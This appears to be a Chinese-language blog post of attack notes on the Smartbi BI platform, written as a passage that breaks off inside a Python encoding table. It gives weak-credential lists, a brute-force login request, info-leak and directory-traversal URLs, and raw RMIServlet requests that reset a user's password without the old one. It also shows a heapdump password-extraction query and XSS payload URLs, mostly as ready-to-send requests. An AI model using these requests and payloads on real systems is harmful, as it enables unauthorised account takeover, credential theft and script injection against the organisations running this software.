<p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/index.jsp">https://127.0.0.1/vision/index.jsp</a></p>
<p>密码正确的情况下，部分平台无法登陆，此时设置user-agent为手机端就可以。</p>
<h1 id="SmartBi的两种传参方式"><a href="#SmartBi的两种传参方式" class="headerlink" title="SmartBi的两种传参方式"></a>SmartBi的两种传参方式</h1><h2 id="RMIServlet加密"><a href="#RMIServlet加密" class="headerlink" title="RMIServlet加密"></a>RMIServlet加密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 148</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span class="line">encode&#x3D;zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+&#x2F;JV&#x2F;uuc&#39;(mKi(Kp719J(~K((~K(((pm719JhNp&#39;uKiMM(&#39;9&#x2F;uu&#x2F;ut&#x2F;uuXIw6--Qw1&#x2F;uu&#x2F;ut&#x2F;uu6QSS&#x2F;uu&#x2F;ut&#x2F;uuY!a0bp1uN&#x2F;uu&#x2F;utk4Qp&#x2F;JT</span><br></pre></td></tr></table></figure>
<h2 id="直接传输"><a href="#直接传输" class="headerlink" title="直接传输"></a>直接传输</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encode&#x3D;zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+&#x2F;JV&#x2F;uuc&#39;(mKi(Kp719J(~K((~K(((pm719JhNp&#39;uKiMM(&#39;9&#x2F;uu&#x2F;ut&#x2F;uuXIw6--Qw1&#x2F;uu&#x2F;ut&#x2F;uu6QSS&#x2F;uu&#x2F;ut&#x2F;uuY!a0bp1uN&#x2F;uu&#x2F;utk4Qp&#x2F;JT</span><br></pre></td></tr></table></figure>
<p>ecode加密字段解密后为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserService+updateUserForChange+[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure>
<p>等同于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">className&#x3D;UserService&amp;methodName&#x3D;updateUserForChange&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure>
<p>构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 148</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span class="line">className&#x3D;UserService&amp;methodName&#x3D;updateUserForChange&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure>


<h1 id="登录暴破"><a href="#登录暴破" class="headerlink" title="登录暴破"></a>登录暴破</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Linux; Android 8.0.0; PRA-LX3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.101 Mobile Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;mobileX&#x2F;login</span><br><span class="line">content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;1DA1DAA51469E646F97AD829F29A2B15</span><br><span class="line"></span><br><span class="line">className&#x3D;UserService&amp;methodName&#x3D;login&amp;params&#x3D;[&quot;admin&quot;,&quot;admin&quot;]</span><br></pre></td></tr></table></figure>
<p>抓取true/false字段</p>
<h1 id="401认证弱口令及敏感目录"><a href="#401认证弱口令及敏感目录" class="headerlink" title="401认证弱口令及敏感目录"></a>401认证弱口令及敏感目录</h1><h2 id="401弱口令"><a href="#401弱口令" class="headerlink" title="401弱口令"></a>401弱口令</h2><p>/vision目录下的文件都需要401认证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">admin&#x2F;admin</span><br><span class="line">admin&#x2F;manager</span><br><span class="line">admin&#x2F;2manager</span><br><span class="line">mining&#x2F;admin</span><br><span class="line">demo&#x2F;demo</span><br><span class="line">manager&#x2F;demo</span><br><span class="line">manager&#x2F;admin</span><br><span class="line">user&#x2F;admin</span><br><span class="line">test&#x2F;admin</span><br><span class="line">huanan&#x2F;admin</span><br></pre></td></tr></table></figure>
<p>实测发现不论用户名输什么，只要密码正确即可</p>
<h2 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h2><p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/version.txt">https://127.0.0.1/vision/version.txt</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021-01-11 15:11:24</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/packageinfo.txt">https://127.0.0.1/vision/packageinfo.txt</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Build Time:20200918153547 </span><br><span class="line">War Type:dist </span><br><span class="line">TAG:Branch_SmartbiV85_6_20190221 </span><br><span class="line">Version:8.5.658863.20385 </span><br><span class="line">VersionType:Smartbi Insight Edition c0d53d51438945fa5b9839b3e0111e660792d2e1 </span><br><span class="line">Spreadsheet fake</span><br></pre></td></tr></table></figure>
<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=/">https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=%2F</a></p>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p> <a target="_blank" rel="noopener" href="https://127.0.0.1/vision/monitor/sysprops.jsp">https://127.0.0.1/vision/monitor/sysprops.jsp</a></p>
<p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode">https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode</a></p>
<p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/monitor/hardwareinfo.jsp">https://127.0.0.1/vision/monitor/hardwareinfo.jsp</a></p>
<h2 id="接口泄露（直接访问wsdl无需401）"><a href="#接口泄露（直接访问wsdl无需401）" class="headerlink" title="接口泄露（直接访问wsdl无需401）"></a>接口泄露（直接访问wsdl无需401）</h2><p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/listwsdl.jsp">https://127.0.0.1/vision/listwsdl.jsp</a></p>
<p>提供资源目录树的访问功能<br><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/services/CatalogService?wsdl">https://127.0.0.1/vision/services/CatalogService?wsdl</a><br>SimpleReportService    提供灵活报表相关操作功能    <a target="_blank" rel="noopener" href="https://127.0.0.1/vision/services/SimpleReportService?wsdl">https://127.0.0.1/vision/services/SimpleReportService?wsdl</a><br>BusinessViewService    提供数据集定义相关操作功能    <a target="_blank" rel="noopener" href="https://127.0.0.1/vision/services/BusinessViewService?wsdl">https://127.0.0.1/vision/services/BusinessViewService?wsdl</a><br>DataSourceService    提供数据源相关操作功能    <a target="_blank" rel="noopener" href="https://127.0.0.1/vision/services/DataSourceService?wsdl">https://127.0.0.1/vision/services/DataSourceService?wsdl</a><br>AnalysisReportService    提供多维分析相关操作功能    <a target="_blank" rel="noopener" href="https://127.0.0.1/vision/services/AnalysisReportService?wsdl">https://127.0.0.1/vision/services/AnalysisReportService?wsdl</a><br>UserManagerService    提供用户相关操作，包括：读取/维护用户信息、读取/维护组信息、读取/维护角色信息、为用户和组分配角色等    <a target="_blank" rel="noopener" href="https://127.0.0.1/vision/services/UserManagerService?wsdl">https://127.0.0.1/vision/services/UserManagerService?wsdl</a></p>
<h2 id="session劫持-重置用户密码（无需原密码）"><a href="#session劫持-重置用户密码（无需原密码）" class="headerlink" title="session劫持+重置用户密码（无需原密码）"></a>session劫持+重置用户密码（无需原密码）</h2><p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/monitor/listsessions.jsp">https://127.0.0.1/vision/monitor/listsessions.jsp</a></p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112181111262.png" alt="image-20210112181111262"></p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112140616396.png" alt="image-20210112140616396"></p>
<p>理论上重置成功，返回为true，但是实际测试过程中修改后的密码既不是改之前的密码，也不是修改后的密码，过一段时间自动重置为原来的密码。</p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112142701281.png" alt="image-20210112142701281"></p>
<p>数据包:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 148</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span class="line">className&#x3D;UserService&amp;methodName&#x3D;updateUserForChange&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 133</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span class="line">className&#x3D;UserService&amp;methodName&#x3D;addUserAttribute&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;SYSTEM_user_isEdit&quot;,&quot;0&quot;,null]</span><br></pre></td></tr></table></figure>
<p>其中I8a94ca4e0175ab4aab4aaae90175d3e824c66a87为用户的id字段，唯一身份标识</p>
<h2 id="heapdump缓存抓取密码"><a href="#heapdump缓存抓取密码" class="headerlink" title="heapdump缓存抓取密码"></a>heapdump缓存抓取密码</h2><p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/monitor/heapdump.jsp">https://127.0.0.1/vision/monitor/heapdump.jsp</a></p>
<p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/monitor/heapdump.jsp?dumpbin=true">https://127.0.0.1/vision/monitor/heapdump.jsp?dumpbin=true</a></p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112105618667.png" alt="image-20210112105618667"></p>
<p>使用Eclipse Memory Analyzer解析内存文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112114052304.png" alt="image-20210112114052304"></p>
<h2 id="反射型-存储型XSS"><a href="#反射型-存储型XSS" class="headerlink" title="反射型/存储型XSS"></a>反射型/存储型XSS</h2><p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/chooser.jsp?key=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&amp;root=/u01/data/domains/app_domain">https://127.0.0.1/vision/chooser.jsp?key=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&amp;root=/u01/data/domains/app_domain</a></p>
<p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/monitor/testmailserver.jsp?host=mail.longtop.com&amp;user=111%22%3E%3Cimg%20src=x%20onerror=prompt(0)%3E&amp;pass=123456">https://127.0.0.1/vision/monitor/testmailserver.jsp?host=mail.longtop.com&amp;user=111%22%3E%3Cimg%20src=x%20onerror=prompt(0)%3E&amp;pass=123456</a></p>
<p>登录后个人参数位置，加密后传参可导致存储型xss</p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112184359942.png" alt="image-20210112184359942"></p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>探测出口ip：</p>
<p><a target="_blank" rel="noopener" href="https://127.0.0.1/vision/monitor/testmailserver.jsp">https://127.0.0.1/vision/monitor/testmailserver.jsp</a></p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112183515813.png" alt="image-20210112183515813"></p>
<p><img src="/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112183534916.png" alt="image-20210112183534916"></p>
<h1 id="RMIServet加解密"><a href="#RMIServet加解密" class="headerlink" title="RMIServet加解密"></a>RMIServet加解密</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">ENCODING_SCHEDULE = &#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;1&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;3&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;4&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;5&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;6&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;7&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;8&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;9&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;!&quot;</span>: <span class="string">&quot;P&quot;</span>, </span><br><span class="line">    <span class="string">&quot;%&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;(&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;)&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;*&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;+&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;.&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;A&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;B&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;C&quot;</span>: <span class="string">&quot;t&quot;</span>, </span><br><span class="line">    <span class="string">&quot;D&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;E&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;F&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;G&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;H&quot;</span>: <span class="string">&quot;r&quot;</span>, <span class="string">&quot;I&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;J&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;K&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;L&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;M&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;N&quot;</span>: <span class="string">&quot;3&quot;</span>, </span><br><span class="line">    <span class="string">&quot;O&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;P&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;Q&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;R&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;S&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;T&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;U&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;V&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;W&quot;</span>: <span class="string">&quot;!&quot;</span>, <span class="string">&quot;X&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;Y&quot;</span>: <span class="string">&quot;)&quot;</span>, </span><br><span class="line">    <span class="string">&quot;Z&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;a&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;b&quot;</span>: <span class="string">&quot;~&quot;</span>, <span class="string">&quot;c&quot;</span>: <span class="string">&quot;i&quot;</span>, <span class="string">&quot;d&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;e&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;f&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;g&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;h&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;i&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;j&quot;</span>: <span class="string">&quot;.&quot;</span>, </span><br><span class="line">    <span class="string">&quot;k&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;l&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;m&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;n&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;o&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;p&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;q&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;r&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;s&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;t&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;u&quot;</span>: <span class="string">&quot;Q&quot;</span>, </span><br><span class="line">    <span class="string">&quot;v&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;w&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;x&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;y&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;z&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;~&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;_&quot;</span>: <span class="string">&quot;y&quot;</span>, </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECODING_SCHEDULE = &#123;</span><br><span class="line">    <span class="string">&quot;7&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;u&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;N&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;K&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;J&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;M&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;9&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;m&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;P&quot;</span>: <span class="string">&quot;!&quot;</span>, </span><br><span class="line">    <span class="string">&quot;/&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;n&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;A&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;E&quot;</span>: <span class="string">&quot;)&quot;</span>, <span class="string">&quot;s&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;f&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;q&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;O&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;V&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;t&quot;</span>: <span class="string">&quot;C&quot;</span>, </span><br><span class="line">    <span class="string">&quot;T&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;a&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;x&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;H&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;r&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;c&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;v&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;l&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;8&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;F&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;3&quot;</span>: <span class="string">&quot;N&quot;</span>, </span><br><span class="line">    <span class="string">&quot;o&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;L&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Y&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;j&quot;</span>: <span class="string">&quot;R&quot;</span>, <span 